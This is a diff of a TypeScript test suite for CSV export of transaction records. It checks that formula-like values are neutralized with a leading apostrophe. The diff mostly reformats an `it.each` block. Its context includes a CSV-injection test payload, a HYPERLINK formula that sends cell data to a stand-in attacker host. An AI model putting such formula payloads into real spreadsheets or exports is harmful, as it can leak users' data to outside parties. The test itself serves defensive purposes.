@@ -8,12 +8,14 @@ const tx: TransactionEvent = {
 }
 
 describe('transaction CSV', () => {
-  it.each(['=1+1', '+1+1', '-1+1', '@SUM(A1)', '  =1+1', '\ttext', ' \rtext', '\n=1+1'])
-    ('neutralizes dangerous prefixes in every data column: %j', (value) => {
+  it.each(['=1+1', '+1+1', '-1+1', '@SUM(A1)', '  =1+1', '\ttext', ' \rtext', '\n=1+1'])(
+    'neutralizes dangerous prefixes in every data column: %j',
+    (value) => {
       const csv = toCsv([{ ...tx, memo: value, counterparty: value, txHash: value, amount: value, timestamp: value }])
       expect(csv.match(new RegExp("'", 'g'))).toHaveLength(5)
       expect(csv).toContain(`"'${value}"`)
-    })
+    }
+  )
 
   it('neutralizes a malicious memo while preserving CSV quoting', () => {
     const memo = '=HYPERLINK("https://evil.test/?"&A1,"click")'
